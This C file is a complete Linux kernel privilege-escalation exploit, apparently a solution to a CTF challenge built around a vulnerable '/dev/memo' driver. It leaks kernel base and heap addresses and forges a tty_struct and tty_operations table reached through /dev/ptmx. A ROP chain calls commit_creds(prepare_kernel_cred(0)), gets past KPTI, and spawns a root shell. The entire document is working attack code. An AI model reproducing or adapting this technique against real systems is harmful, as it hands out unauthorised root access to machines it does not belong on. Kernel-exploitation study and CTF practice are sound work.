#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>

unsigned long kbase, kheap;
unsigned long ptm_unix98_ops = 0xe65900;

unsigned long rop_mov_cr4_edi = 0x04b6a1;
unsigned long rop_push_r12_add_rbp_41_ebx_pop_rsp_r13 = 0x94d4e3;
unsigned long rop_pop_rdi = 0x001268;
unsigned long rop_pop_rcx = 0x04c852;
unsigned long rop_mov_rdi_rax = 0x019dcb;
unsigned long rop_bypass_kpti = 0xa00a45;
unsigned long commit_creds = 0xffffffff9127b8b0 - 0xffffffff91200000;
unsigned long prepare_kernel_cred = 0xffffffff9127bb50 - 0xffffffff91200000;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] Win!");
  execve("/bin/sh", argv, envp);
}

int main() {
  unsigned long buf[0x400 / sizeof(unsigned long)];
  save_state();

  /* open drivers */
  int fd = open("/dev/memo", O_RDWR);
  if (fd < 0) {
    perror("/dev/memo");
    return 1;
  }
  int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  if (ptmx < 0) {
    perror("/dev/ptmx");
    return 1;
  }

  /* leak kbase & kheap */
  lseek(fd, 0x100, SEEK_SET);
  read(fd, buf, 0x400);
  kbase = buf[(0x300 + 0x18) / sizeof(unsigned long)] - ptm_unix98_ops;
  kheap = buf[(0x300 + 0x38) / sizeof(unsigned long)] - 0x38 - 0x400;
  printf("[+] kbase = 0x%016lx\n", kbase);
  printf("[+] kheap = 0x%016lx\n", kheap);

  /* write fake vtable, rop chain & overwrite ops */
  // fake tty_struct
  buf[(0x300 + 0x18) / sizeof(unsigned long)] = kheap + 0x100; // ops
  // fake tty_operations
  buf[12] = kbase + rop_push_r12_add_rbp_41_ebx_pop_rsp_r13; // ioctl
  // rop chain
  unsigned long *chain = &buf[0x100 / sizeof(unsigned long)];
  *chain++ = kbase + rop_pop_rdi;
  *chain++ = 0;
  *chain++ = kbase + prepare_kernel_cred;
  *chain++ = kbase + rop_pop_rcx;     // make rcx 0 to bypass rep
  *chain++ = 0;
  *chain++ = kbase + rop_mov_rdi_rax;
  *chain++ = kbase + commit_creds;    // cc(pkc(0));
  *chain++ = kbase + rop_bypass_kpti; // return to usermode
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;

  // overwrite!
  lseek(fd, 0x100, SEEK_SET);
  write(fd, buf, 0x400);

  /* ignite! */
  ioctl(ptmx, 0xdeadbeef, kheap + 0x200 - 8); // -8 for pop r13
  return 0;
}
